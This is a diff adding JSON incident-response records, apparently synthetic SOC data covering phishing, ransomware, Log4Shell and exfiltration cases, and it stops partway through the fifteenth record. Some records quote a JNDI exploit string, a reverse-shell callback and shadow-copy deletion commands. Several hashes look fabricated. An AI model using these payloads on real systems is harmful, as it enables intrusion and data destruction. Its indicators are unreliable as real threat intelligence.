@@ -1,0 +1,885 @@
+[
+  {
+    "incident_id": "INC-2026-0001",
+    "timestamp": "2026-03-10T08:14:22Z",
+    "alert_type": "Suspicious PowerShell execution",
+    "severity": "High",
+    "description": "Base64-encoded PowerShell process spawned by winword.exe executing an in-memory script with WebClient download and AMSI bypass string patching.",
+    "affected_host": "WS-FIN-042.corp.local (10.20.4.42)",
+    "user_account": "CORP\\sarah.jenkins",
+    "indicators": {
+      "ip_addresses": ["185.220.101.5", "10.20.4.42"],
+      "domains": ["cdn-update-auth.com"],
+      "urls": ["http://cdn-update-auth.com/payload/stage1.ps1"],
+      "file_hashes": [
+        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+        "4a7d1ed414474e4033ac29ccb8653d9b0efae36a2810be58d4a4608abf3ec051"
+      ],
+      "process_names": ["winword.exe", "powershell.exe", "conhost.exe"],
+      "file_paths": ["C:\\Users\\sarah.jenkins\\AppData\\Local\\Temp\\update.vbs"],
+      "registry_keys": ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinDefSync"]
+    },
+    "mitre_attack": {
+      "tactic": "Execution / Defense Evasion",
+      "technique_id": "T1059.001",
+      "technique_name": "Command and Scripting Interpreter: PowerShell"
+    },
+    "investigation_steps": [
+      "Extracted encoded CLI string from EDR event and decoded Base64 payload revealing IEX WebClient download.",
+      "Identified parent process winword.exe with active child powershell.exe bypasses.",
+      "Queried proxy logs for connections to cdn-update-auth.com; noted 420 KB egress transfer.",
+      "Checked memory dump for AMSI patch signatures at AmsiScanBuffer address.",
+      "Audited recent emails in user mailbox to locate source macro-enabled attachment."
+    ],
+    "root_cause": "User opened a weaponized phishing email attachment ('Q1_Vendor_Invoice_9821.docm') which executed an obfuscated VBA macro spawning PowerShell.",
+    "remediation": "Host isolated via EDR. Blocked cdn-update-auth.com and 185.220.101.5 at perimeter firewall. Revoked user Kerberos session tokens and rotated credentials. Macro execution disabled globally via Group Policy for unverified Office templates.",
+    "final_outcome": "True Positive - Malicious Dropper Contained",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Accurately flagged AMSI bypass signature and correlated parent Word process with downstream network egress."
+    },
+    "lessons_learned": "Attackers frequently use AMSI memory patching prior to downloading second-stage DLLs. Monitoring AmsiScanBuffer memory write operations provides faster early detection than script-block logging alone."
+  },
+  {
+    "incident_id": "INC-2026-0002",
+    "timestamp": "2026-03-10T14:45:10Z",
+    "alert_type": "Phishing and malicious attachments",
+    "severity": "Medium",
+    "description": "Inbound email containing an SVG smuggling HTML attachment designed to assemble a malicious ISO payload locally on the victim machine, evading secure email gateways.",
+    "affected_host": "WS-HR-012.corp.local (10.20.2.12)",
+    "user_account": "CORP\\david.miller",
+    "indicators": {
+      "ip_addresses": ["91.240.118.84", "10.20.2.12"],
+      "domains": ["secure-doc-verify.org"],
+      "urls": ["https://secure-doc-verify.org/portal/auth"],
+      "file_hashes": [
+        "8f40776ee46f7c7da196d41870a4c5ce70e8a8b13db53267c7442ca024cb5a07",
+        "d59a7f34c2b291d295ff6d8b2d1266d6c382103328e18408f6261f9dfa5fc7d2"
+      ],
+      "process_names": ["chrome.exe", "explorer.exe"],
+      "file_paths": ["C:\\Users\\david.miller\\Downloads\\Benefits_Review_2026.html", "C:\\Users\\david.miller\\Downloads\\document.iso"],
+      "registry_keys": []
+    },
+    "mitre_attack": {
+      "tactic": "Initial Access",
+      "technique_id": "T1566.001",
+      "technique_name": "Phishing: Spearphishing Attachment"
+    },
+    "investigation_steps": [
+      "Extracted embedded base64 JavaScript blob inside SVG tags of Benefits_Review_2026.html.",
+      "Simulated DOM assembly revealing browser Blob generation creating an ISO file on disk.",
+      "Verified endpoint EDR telemetry: ISO file was downloaded but user had not yet mounted or executed the container.",
+      "Scanned enterprise mailboxes for subject 'Urgent: Employee Benefits Review 2026'; found 14 identical messages."
+    ],
+    "root_cause": "Spoofed HR sender bypassed DMARC softfail due to misconfigured domain alignment check in legacy email gateway.",
+    "remediation": "Purged 14 delivered phishing emails from all Office 365 mailboxes. Enforced strict DMARC reject policy on mail filter. Added domain secure-doc-verify.org to enterprise sinkhole.",
+    "final_outcome": "True Positive - Neutralized Pre-Execution",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "The HTML smuggling breakdown helped identify the hidden ISO file before the user could double-click it."
+    },
+    "lessons_learned": "SVG smuggling bypasses static attachment scanners because the executable payload does not cross the network as a discrete file. In-browser file blob creation should be audited via browser telemetry."
+  },
+  {
+    "incident_id": "INC-2026-0003",
+    "timestamp": "2026-03-11T02:18:04Z",
+    "alert_type": "Ransomware behaviour",
+    "severity": "Critical",
+    "description": "Rapid creation of encrypted files with extension .locked, deletion of Volume Shadow Copies via vssadmin.exe, and automated termination of database services.",
+    "affected_host": "FS-CORP-01.corp.local (10.10.10.55)",
+    "user_account": "CORP\\svc_backup_admin",
+    "indicators": {
+      "ip_addresses": ["194.26.29.112", "10.10.10.55"],
+      "domains": ["decrypt-onion-gateway.cc"],
+      "urls": ["http://decrypt-onion-gateway.cc/api/notify"],
+      "file_hashes": [
+        "c8928c94e9f7a7d45f3d790d90e290f6d6c97a5b6d9e0f317b9b104ec0337c88",
+        "12a7bf89d13498bfe13b192800dfa349bc98fa10b98e2193b2a8d39e144bb203"
+      ],
+      "process_names": ["vssadmin.exe", "bcdedit.exe", "cryptsvc.exe", "svchost.exe"],
+      "file_paths": [
+        "C:\\Windows\\Temp\\encr.exe",
+        "D:\\Shares\\Finance\\README_RECOVER_FILES.txt"
+      ],
+      "registry_keys": ["HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network"]
+    },
+    "mitre_attack": {
+      "tactic": "Impact",
+      "technique_id": "T1486",
+      "technique_name": "Data Encrypted for Impact"
+    },
+    "investigation_steps": [
+      "Triggered emergency network containment on FS-CORP-01 within 3 minutes of high IOPS encryption alert.",
+      "Verified vssadmin delete shadows /all /quiet and bcdedit /set recoveryenabled no command invocations.",
+      "Identified compromised service account svc_backup_admin with interactive logon from compromised admin workstation WS-ADM-03.",
+      "Checked immutable off-site backups: verified last clean snapshot was 4 hours prior to encryption onset."
+    ],
+    "root_cause": "Threat actor utilized compromised backup administrator credentials obtained via unpatched Fortinet VPN vulnerability (CVE-2024-21762) to deploy ransomware binary.",
+    "remediation": "Severed network switch ports for file server cluster. Disabled compromised service account svc_backup_admin. Restored file shares from immutable ZFS snapshots with zero data loss. Revoked all VPN active sessions and rolled service passwords.",
+    "final_outcome": "True Positive - Contained with Successful Restoration",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Crucial correlation of vssadmin deletion with the compromised backup account enabled swift shutdown before cloud shares were touched."
+    },
+    "lessons_learned": "Service accounts configured for enterprise backups must never have interactive logon rights on endpoints. Ransomware operators specifically target backup credentials to wipe shadow copies."
+  },
+  {
+    "incident_id": "INC-2026-0004",
+    "timestamp": "2026-03-11T09:30:45Z",
+    "alert_type": "Brute-force login attempts",
+    "severity": "Medium",
+    "description": "Distributed password spraying attack targeting Active Directory accounts across multiple internal subnets from a single internal bastion jump host.",
+    "affected_host": "DC-PRIMARY-01.corp.local (10.10.1.10)",
+    "user_account": "Multiple (420 user accounts targeted)",
+    "indicators": {
+      "ip_addresses": ["10.10.5.15", "10.10.1.10"],
+      "domains": [],
+      "urls": [],
+      "file_hashes": [
+        "3d9a102948b812f8bcda81920ca88172837bcda1982736450192837465019283"
+      ],
+      "process_names": ["kerbrute.exe", "cmd.exe"],
+      "file_paths": ["C:\\Users\\Public\\kerbrute.exe"],
+      "registry_keys": []
+    },
+    "mitre_attack": {
+      "tactic": "Credential Access",
+      "technique_id": "T1110.003",
+      "technique_name": "Brute Force: Password Spraying"
+    },
+    "investigation_steps": [
+      "Analyzed Event ID 4625 (An account failed to log on) on Primary Domain Controller: 420 events within 8 minutes.",
+      "Identified failure pattern: 1 password attempt per account with seasonal password string 'Spring2026!'.",
+      "Traced source IP 10.10.5.15 back to Linux jump host server JH-01.",
+      "Found three accounts locked out: helpdesk_clerk, guest_contractor, and temp_analyst.",
+      "Confirmed single successful logon (Event ID 4624) for user CORP\\temp_analyst before lockout threshold."
+    ],
+    "root_cause": "Contractor jump host had default SSH credentials, allowing attacker to pivot internally and execute Kerbrute password spray against LDAP.",
+    "remediation": "Isolated jump host JH-01. Force reset CORP\\temp_analyst and enforced Smart Card / MFA requirement across all internal services. Blocked internal LDAP traffic originating from non-management subnets.",
+    "final_outcome": "True Positive - Lateral Movement Attempt Thwarted",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "The spray rate analysis correctly noted the slow cadence designed to bypass 5-attempt lockout policies."
+    },
+    "lessons_learned": "Password spraying relies on common organizational dictionary words paired with current seasons or years. Fine-grained password policies and FIDO2 keys render password spraying obsolete."
+  },
+  {
+    "incident_id": "INC-2026-0005",
+    "timestamp": "2026-03-12T03:22:18Z",
+    "alert_type": "Suspicious outbound connections",
+    "severity": "High",
+    "description": "Regular interval HTTP POST beaconing with jitter originating from an unauthorized process running inside svchost.exe injection memory space.",
+    "affected_host": "WS-DEV-109.corp.local (10.20.5.109)",
+    "user_account": "CORP\\kevin.chen",
+    "indicators": {
+      "ip_addresses": ["45.142.214.9", "10.20.5.109"],
+      "domains": ["api.telemetry-collector-service.net"],
+      "urls": ["https://api.telemetry-collector-service.net/v1/heartbeat"],
+      "file_hashes": [
+        "7b98214fa8712398bcda91823746192837461928374619283746192837461928"
+      ],
+      "process_names": ["svchost.exe", "msbuild.exe"],
+      "file_paths": ["C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"],
+      "registry_keys": []
+    },
+    "mitre_attack": {
+      "tactic": "Command and Control",
+      "technique_id": "T1071.001",
+      "technique_name": "Application Layer Protocol: Web Protocols"
+    },
+    "investigation_steps": [
+      "Extracted Zeek network flow logs: HTTPS beaconing every 45 seconds with 15% random jitter to IP 45.142.214.9.",
+      "Performed TLS fingerprinting (JA3 / JA3S): JA3 hash matched known Cobalt Strike beacon default malleable C2 profile.",
+      "Inspected host process memory: discovered hollowed svchost.exe memory region marked PAGE_EXECUTE_READWRITE.",
+      "Identified initial compile-and-execute invocation via MSBuild.exe from developer project directory."
+    ],
+    "root_cause": "Developer cloned an untrusted third-party npm/NuGet package with weaponized pre-build MSBuild inline task payload.",
+    "remediation": "Host disconnected from network. Terminated rogue process tree. Purged contaminated node_modules / packages cache. Added domain and IP to firewall and DNS RPZ blocklists. Developer environment rebuilt from golden image.",
+    "final_outcome": "True Positive - C2 Beacon Terminated",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Detection of the Cobalt Strike malleable C2 profile in JA3 signatures confirmed threat severity immediately."
+    },
+    "lessons_learned": "Developers frequently execute build tasks that allow arbitrary code execution. CI/CD and developer workstations require application whitelisting and egress filtering on high-risk ports."
+  },
+  {
+    "incident_id": "INC-2026-0006",
+    "timestamp": "2026-03-12T11:05:33Z",
+    "alert_type": "Malware persistence",
+    "severity": "Medium",
+    "description": "Creation of an unusual scheduled task disguised as a Google Chrome update task executing an obfuscated VBScript script from C:\\ProgramData.",
+    "affected_host": "WS-EXEC-002.corp.local (10.20.1.2)",
+    "user_account": "CORP\\elizabeth.vance",
+    "indicators": {
+      "ip_addresses": ["193.106.191.24", "10.20.1.2"],
+      "domains": ["cloud-sync-driver.com"],
+      "urls": ["http://cloud-sync-driver.com/sync.vbs"],
+      "file_hashes": [
+        "99a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcde"
+      ],
+      "process_names": ["schtasks.exe", "wscript.exe"],
+      "file_paths": [
+        "C:\\ProgramData\\GoogleUpdateHelper.vbs",
+        "C:\\Windows\\System32\\Tasks\\GoogleUpdateTaskMachineUA_Daily"
+      ],
+      "registry_keys": ["HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks"]
+    },
+    "mitre_attack": {
+      "tactic": "Persistence",
+      "technique_id": "T1053.005",
+      "technique_name": "Scheduled Task/Job: Scheduled Task"
+    },
+    "investigation_steps": [
+      "Audited Windows Security Log Event ID 4698 (A scheduled task was created).",
+      "Extracted XML task definition: Task 'GoogleUpdateTaskMachineUA_Daily' configured to run every logon under SYSTEM privileges.",
+      "De-obfuscated C:\\ProgramData\\GoogleUpdateHelper.vbs: script retrieves payload and executes via WScript.Shell.",
+      "Correlated creation timestamp with earlier drive-by watering hole browsing session on executive laptop."
+    ],
+    "root_cause": "Executive visited a compromised industry legal blog which served a drive-by browser exploit dropping the persistence mechanism.",
+    "remediation": "Task removed via schtasks /delete. VBS file purged. User browser profiles reset and Chrome security policies tightened. Host full scan conducted with updated EDR definitions.",
+    "final_outcome": "True Positive - Persistence Mechanism Removed",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "The scheduled task camouflage was tricky; comparing task XML against genuine Google update tasks made the deception obvious."
+    },
+    "lessons_learned": "Adversaries blend persistence tasks with legitimate vendor naming conventions (Google, Adobe, Microsoft). Validating digital signatures of binaries referenced in task actions is essential."
+  },
+  {
+    "incident_id": "INC-2026-0007",
+    "timestamp": "2026-03-12T16:40:50Z",
+    "alert_type": "Privilege escalation",
+    "severity": "High",
+    "description": "Execution of BadPotato / Named Pipe impersonation exploit by a low-privileged IIS application pool identity resulting in NT AUTHORITY\\SYSTEM token creation.",
+    "affected_host": "SRV-WEB-EXT01.corp.local (10.10.20.15)",
+    "user_account": "IIS APPPOOL\\DefaultAppPool",
+    "indicators": {
+      "ip_addresses": ["10.10.20.15"],
+      "domains": [],
+      "urls": [],
+      "file_hashes": [
+        "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b"
+      ],
+      "process_names": ["w3wp.exe", "cmd.exe", "potato.exe", "whoami.exe"],
+      "file_paths": [
+        "C:\\inetpub\\wwwroot\\uploads\\potato.exe",
+        "C:\\Windows\\Temp\\system_shell.exe"
+      ],
+      "registry_keys": []
+    },
+    "mitre_attack": {
+      "tactic": "Privilege Escalation",
+      "technique_id": "T1134.001",
+      "technique_name": "Access Token Manipulation: Token Impersonation/Theft"
+    },
+    "investigation_steps": [
+      "Observed w3wp.exe spawning cmd.exe followed by unclassified binary potato.exe in uploads directory.",
+      "Audited Token Privilege Assigned (Event ID 4672) for newly created cmd.exe process showing SeImpersonatePrivilege abuse.",
+      "Captured process lineage: whoami /priv -> potato.exe -> spawned reverse shell under NT AUTHORITY\\SYSTEM.",
+      "Traced origin to file upload vulnerability in legacy customer portal."
+    ],
+    "root_cause": "Unauthenticated file upload vulnerability allowed binary placement, and service account retained unnecessary SeImpersonatePrivilege.",
+    "remediation": "Terminated rogue process tree and quarantined potato.exe. Stripped SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege from IIS worker process virtual accounts. Patched customer portal upload handler to restrict file extensions and prevent executable permissions.",
+    "final_outcome": "True Positive - SYSTEM Elevation Blocked and Patched",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Identifying SeImpersonatePrivilege exploitation guided immediate hardening of IIS service account privileges."
+    },
+    "lessons_learned": "Service accounts running web applications should strictly have SeImpersonatePrivilege removed if RPC or DCOM token impersonation is not required."
+  },
+  {
+    "incident_id": "INC-2026-0008",
+    "timestamp": "2026-03-13T01:12:00Z",
+    "alert_type": "Unusual account activity",
+    "severity": "High",
+    "description": "Impossible travel detection: Successful Okta authentication from Frankfurt, Germany followed 22 minutes later by Azure portal logon from São Paulo, Brazil.",
+    "affected_host": "Cloud / Identity Provider (Azure AD / Okta)",
+    "user_account": "robert.sanchez@enterprise.com",
+    "indicators": {
+      "ip_addresses": ["185.190.140.12", "177.136.240.8"],
+      "domains": ["login.microsoftonline.com"],
+      "urls": [],
+      "file_hashes": [],
+      "process_names": [],
+      "file_paths": [],
+      "registry_keys": []
+    },
+    "mitre_attack": {
+      "tactic": "Initial Access",
+      "technique_id": "T1078.004",
+      "technique_name": "Valid Accounts: Cloud Accounts"
+    },
+    "investigation_steps": [
+      "Pulled Azure AD Sign-in logs: 00:50 UTC from IP 185.190.140.12 (Frankfurt, Germany) with valid MFA push approval.",
+      "Pulled Azure AD Sign-in logs: 01:12 UTC from IP 177.136.240.8 (São Paulo, Brazil) using passwordless session token.",
+      "Contacted user via out-of-band telephone call: confirmed user was at home in Dallas, Texas and had received an unexpected Duo push prompt which they accidentally tapped 'Approve'.",
+      "Audited cloud actions taken: attacker attempted to register a new FIDO security key in Azure Security Info portal."
+    ],
+    "root_cause": "MFA fatigue (push exhaustion) attack following credential stuffing from dark-web breach data dump.",
+    "remediation": "Revoked all active Azure AD and Okta refresh tokens. Enforced Duo Number Matching (requiring user to enter 2-digit on-screen number) to eliminate blind push approvals. Removed unauthorized authenticator registration.",
+    "final_outcome": "True Positive - Account Takeover Prevented",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "The impossible travel correlation combined with out-of-band verification caught the attacker during the secondary factor enrollment stage."
+    },
+    "lessons_learned": "Simple push notifications are vulnerable to push bombing/fatigue. Enforcing number matching or biometric FIDO2 hardware tokens is non-negotiable for enterprise cloud access."
+  },
+  {
+    "incident_id": "INC-2026-0009",
+    "timestamp": "2026-03-13T07:44:19Z",
+    "alert_type": "Data exfiltration",
+    "severity": "Critical",
+    "description": "High volume encrypted data staging into 7-Zip archives followed by multi-threaded egress transfer via rclone.exe to Mega.io cloud storage.",
+    "affected_host": "DB-PROD-SQL02.corp.local (10.10.30.22)",
+    "user_account": "CORP\\sql_service_run",
+    "indicators": {
+      "ip_addresses": ["31.216.145.8", "10.10.30.22"],
+      "domains": ["mega.nz", "api.mega.co.nz"],
+      "urls": ["https://api.mega.co.nz/cs"],
+      "file_hashes": [
+        "44d1837f6a2b1029c8e9d0a1b2c3d4e5f60718293a4b5c6d7e8f90123456789a",
+        "aa87b219c02d1847561928374610293847561029384756102938475610293847"
+      ],
+      "process_names": ["7za.exe", "rclone.exe", "powershell.exe"],
+      "file_paths": [
+        "C:\\PerfLogs\\archive_2026_q1.7z.001",
+        "C:\\PerfLogs\\archive_2026_q1.7z.002",
+        "C:\\PerfLogs\\rclone.conf"
+      ],
+      "registry_keys": []
+    },
+    "mitre_attack": {
+      "tactic": "Exfiltration",
+      "technique_id": "T1567.002",
+      "technique_name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+    },
+    "investigation_steps": [
+      "Network perimeter monitor triggered high-bandwidth alert: 18.4 GB transferred to mega.co.nz in 14 minutes.",
+      "Investigated process tree on database server DB-PROD-SQL02: found 7za.exe spawned to compress SQL customer export tables with AES-256 encryption.",
+      "Discovered rclone.exe executed with configuration pointing to remote Mega bucket 'corp_leak'.",
+      "Extracted command history showing SQL table dumping via bcp utility earlier that morning."
+    ],
+    "root_cause": "SQL injection in reporting microservice allowed attacker to execute xp_cmdshell and stage data staging tools on the database server.",
+    "remediation": "Terminated rclone and 7za processes immediately. Blocked outbound network connectivity from database server subnets to public internet. Disabled xp_cmdshell on SQL Server instance. Initiated legal and regulatory breach notification assessment.",
+    "final_outcome": "True Positive - Exfiltration Interrupted at 65% Transfer",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "The detection of rclone configuration files in C:\\PerfLogs was a vital clue indicating standardized adversary tooling."
+    },
+    "lessons_learned": "Database servers should never have direct outbound internet routing. Database egress must be strictly restricted to internal API gateways and management proxies."
+  },
+  {
+    "incident_id": "INC-2026-0010",
+    "timestamp": "2026-03-13T13:20:05Z",
+    "alert_type": "Web server compromise",
+    "severity": "Critical",
+    "description": "Log4Shell (CVE-2021-44228) remote code execution probe in User-Agent header of Apache Tomcat server leading to Java reverse shell execution.",
+    "affected_host": "SRV-APP-CAT01.corp.local (10.10.40.80)",
+    "user_account": "tomcat",
+    "indicators": {
+      "ip_addresses": ["195.123.246.18", "10.10.40.80"],
+      "domains": ["ldap-redirector.security-testing-domain.org"],
+      "urls": ["ldap://195.123.246.18:1389/Exploit"],
+      "file_hashes": [
+        "f1e2d3c4b5a60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0"
+      ],
+      "process_names": ["java", "sh", "curl", "nc"],
+      "file_paths": ["/tmp/rev.sh", "/opt/tomcat/logs/catalina.out"],
+      "registry_keys": []
+    },
+    "mitre_attack": {
+      "tactic": "Initial Access",
+      "technique_id": "T1190",
+      "technique_name": "Exploit Public-Facing Application"
+    },
+    "investigation_steps": [
+      "Inspected catalina.out log: found ${jndi:ldap://195.123.246.18:1389/Exploit} payload logged in HTTP User-Agent.",
+      "Confirmed outbound LDAP query (port 1389) followed by secondary HTTP class file download by Java process.",
+      "Found spawned child process: java -> sh -> /tmp/rev.sh opening connection back to 195.123.246.18:4444.",
+      "Dumped process memory to extract injected Java class bytecode."
+    ],
+    "root_cause": "Unpatched legacy internal Tomcat management console exposed to DMZ proxy without WAF header inspection.",
+    "remediation": "Killed reverse shell process and isolated SRV-APP-CAT01. Upgraded Log4j library to patched 2.17.1 version and set -Dlog4j2.formatMsgNoLookups=true system flag. Deployed WAF rule blocking ${jndi: regex patterns across all incoming headers.",
+    "final_outcome": "True Positive - Remote Code Execution Severed",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Flagged the outbound JNDI LDAP lookup immediately, helping differentiate between automated scan noise and confirmed weaponized exploitation."
+    },
+    "lessons_learned": "Java applications in DMZ environments must have JVM-level flags disabling JNDI lookups and outbound egress filtering blocking rogue LDAP and RMI ports."
+  },
+  {
+    "incident_id": "INC-2026-0011",
+    "timestamp": "2026-03-14T04:55:12Z",
+    "alert_type": "Suspicious PowerShell execution",
+    "severity": "Medium",
+    "description": "PowerShell command executing Get-WmiObject and net user queries with output redirected to CSV file in temp folder during non-business hours.",
+    "affected_host": "WS-ADM-018.corp.local (10.20.4.18)",
+    "user_account": "CORP\\admin_backup",
+    "indicators": {
+      "ip_addresses": ["10.20.4.18"],
+      "domains": [],
+      "urls": [],
+      "file_hashes": [],
+      "process_names": ["powershell.exe", "net.exe", "wmic.exe"],
+      "file_paths": ["C:\\Windows\\Temp\\host_audit_export.csv"],
+      "registry_keys": []
+    },
+    "mitre_attack": {
+      "tactic": "Discovery",
+      "technique_id": "T1087.002",
+      "technique_name": "Account Discovery: Domain Account"
+    },
+    "investigation_steps": [
+      "Reviewed PowerShell script block event logs (Event ID 4104).",
+      "Found enumeration commands: Get-ADUser -Filter * and wmic product get name,version.",
+      "Interviewed system administration team regarding scheduled maintenance window.",
+      "Verified IT ticket INC-CHG-9941 authorizing quarterly asset compliance scan script."
+    ],
+    "root_cause": "Authorized IT system administrator running scheduled inventory compliance audit script that was not registered in the SIEM whitelist.",
+    "remediation": "Verified script hash and author signature. Registered IT inventory compliance script in SIEM alert suppression whitelist. No compromise occurred.",
+    "final_outcome": "False Positive - Authorized IT Compliance Audit",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Correctly highlighted that while the commands match discovery techniques, the execution was signed and linked to an approved change ticket."
+    },
+    "lessons_learned": "Legitimate administrative scripts frequently mirror adversary discovery techniques. Whitelisting signed administrative automation prevents SOC alert fatigue."
+  },
+  {
+    "incident_id": "INC-2026-0012",
+    "timestamp": "2026-03-14T10:18:30Z",
+    "alert_type": "Phishing and malicious attachments",
+    "severity": "High",
+    "description": "Password-protected ZIP archive named 'Q1_Executive_Bonus_Matrix.zip' delivered via external email with password provided in email body.",
+    "affected_host": "WS-MKT-007.corp.local (10.20.3.7)",
+    "user_account": "CORP\\lisa.wong",
+    "indicators": {
+      "ip_addresses": ["185.176.27.102", "10.20.3.7"],
+      "domains": ["payroll-portal-notifications.com"],
+      "urls": ["http://payroll-portal-notifications.com/bonus/verify"],
+      "file_hashes": [
+        "c0d1e2f3a4b5c6d7e8f90123456789abcdef0123456789abcdef0123456789ab"
+      ],
+      "process_names": ["7zFM.exe", "wscript.exe", "cmd.exe"],
+      "file_paths": [
+        "C:\\Users\\lisa.wong\\Downloads\\Q1_Executive_Bonus_Matrix.zip",
+        "C:\\Users\\lisa.wong\\AppData\\Local\\Temp\\Bonus_Overview.js"
+      ],
+      "registry_keys": []
+    },
+    "mitre_attack": {
+      "tactic": "Initial Access",
+      "technique_id": "T1566.002",
+      "technique_name": "Phishing: Spearphishing Link"
+    },
+    "investigation_steps": [
+      "Extracted ZIP archive in sandbox using provided password 'Bonus2026!'.",
+      "Discovered double-extension file 'Bonus_Overview.pdf.js' designed to mimic PDF icon.",
+      "Analyzed JavaScript file: script attempts to download AsyncRAT stage 1 payload from payroll-portal-notifications.com.",
+      "Confirmed EDR on workstation WS-MKT-007 blocked wscript.exe execution before network request was initiated."
+    ],
+    "root_cause": "Targeted spearphishing campaign using password-protected ZIP to bypass email gateway antivirus scanning.",
+    "remediation": "Quarantined email across enterprise mailboxes. Updated mail security gateway to hold password-protected ZIP files with external origin for human sandbox inspection. Domain blocked across all perimeter proxies.",
+    "final_outcome": "True Positive - Prevented by EDR Script Block",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "The double-extension disguise detection was spot on. Analyst confirmed the user fell for the PDF icon trick."
+    },
+    "lessons_learned": "Password-protected archives continue to be the primary method for bypassing email gateway attachment analysis. Policy requiring user confirmation or automated sandbox detonation is crucial."
+  },
+  {
+    "incident_id": "INC-2026-0013",
+    "timestamp": "2026-03-14T17:35:40Z",
+    "alert_type": "Ransomware behaviour",
+    "severity": "Critical",
+    "description": "Mass file renaming to extension .enc, execution of cipher.exe /w to wipe deleted file clusters, and canary file modification detected by file integrity monitor.",
+    "affected_host": "SRV-FILE-ENG02.corp.local (10.10.10.60)",
+    "user_account": "CORP\\marcus.vance",
+    "indicators": {
+      "ip_addresses": ["185.193.88.21", "10.10.10.60"],
+      "domains": ["onion-drop-point-09.cc"],
+      "urls": [],
+      "file_hashes": [
+        "2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c"
+      ],
+      "process_names": ["cipher.exe", "powershell.exe", "locker_x64.exe"],
+      "file_paths": [
+        "C:\\Users\\Public\\locker_x64.exe",
+        "E:\\Engineering_Drawings\\HOW_TO_RESTORE_FILES.hta"
+      ],
+      "registry_keys": ["HKCU\\Control Panel\\Desktop\\Wallpaper"]
+    },
+    "mitre_attack": {
+      "tactic": "Impact",
+      "technique_id": "T1486",
+      "technique_name": "Data Encrypted for Impact"
+    },
+    "investigation_steps": [
+      "Canary file tripwire alerted at E:\\Engineering_Drawings\\!000_canary.doc.",
+      "EDR agent initiated automated host network quarantine within 45 seconds of canary trigger.",
+      "Identified user marcus.vance compromised via RDP session from VPN pool.",
+      "Preserved memory dump for encryption key recovery analysis."
+    ],
+    "root_cause": "Compromised engineering workstation logged into RDP without MFA; attacker used brute-forced local credentials to drop locker payload.",
+    "remediation": "Isolated file server and compromised engineering workstation. Terminated locker process. Restored 120 encrypted files from Volume Shadow Copy which was saved due to early canary tripwire alert. Enforced MFA on all RDP endpoints.",
+    "final_outcome": "True Positive - Canary File Prevented Catastrophic Encryption",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "The canary file early warning system worked as designed. The recommendation to check shadow copy integrity first prevented unneeded full-disk re-imaging."
+    },
+    "lessons_learned": "Canary tripwires placed in high-value directory shares provide faster detection than signature matching against novel ransomware variants."
+  },
+  {
+    "incident_id": "INC-2026-0014",
+    "timestamp": "2026-03-15T02:00:25Z",
+    "alert_type": "Brute-force login attempts",
+    "severity": "Low",
+    "description": "50 consecutive failed SSH login attempts on internal Linux build server within 2 minutes originating from automated CI/CD pipeline agent.",
+    "affected_host": "SRV-BUILD-LNX01.corp.local (10.10.50.12)",
+    "user_account": "jenkins_deployer",
+    "indicators": {
+      "ip_addresses": ["10.10.50.100", "10.10.50.12"],
+      "domains": [],
+      "urls": [],
+      "file_hashes": [],
+      "process_names": ["sshd"],
+      "file_paths": ["/var/log/auth.log"],
+      "registry_keys": []
+    },
+    "mitre_attack": {
+      "tactic": "Credential Access",
+      "technique_id": "T1110.001",
+      "technique_name": "Brute Force: Password Guessing"
+    },
+    "investigation_steps": [
+      "Inspected /var/log/auth.log: repeated 'Failed password for invalid user' and 'Failed publickey'.",
+      "Correlated source IP 10.10.50.100 to Jenkins runner worker node 04.",
+      "Checked Jenkins job execution log: found newly deployed nightly build job using an expired SSH private key file.",
+      "Confirmed no interactive user involvement or external IP routing."
+    ],
+    "root_cause": "Expired SSH deployment key in Jenkins credentials store triggered automated retry loop across build jobs.",
+    "remediation": "Updated Jenkins pipeline with renewed Ed25519 deploy key. Reset failed attempt counter in Fail2ban. Alert closed as misconfiguration.",
+    "final_outcome": "False Positive - CI/CD Pipeline Key Expiration",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Good correlation with internal subnet IP range and DevOps pipeline schedules."
+    },
+    "lessons_learned": "Automated deployment agents with expired keys frequently generate alerts resembling brute force attacks. Distinguishing service automation accounts reduces false alarms."
+  },
+  {
+    "incident_id": "INC-2026-0015",
+    "timestamp": "2026-03-15T08:10:14Z",
+    "alert_type": "Suspicious outbound connections",
+    "severity": "High",
+    "description": "High volume of repetitive DNS TXT record queries to dynamic DNS subdomain indicating DNS data tunneling or C2 channel communication.",
+    "affected_host": "WS-ACC-014.corp.local (10.20.4.14)",
+    "user_account": "CORP\\nancy.wheeler",
+    "indicators": {
+      "ip_addresses": ["10.20.4.14", "10.10.1.10"],
+      "domains": ["ns1.dnstunnel-infra-sync.xyz", "dnstunnel-infra-sync.xyz"],
+      "urls": [],
+      "file_hashes": [
+        "7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b"
+      ],
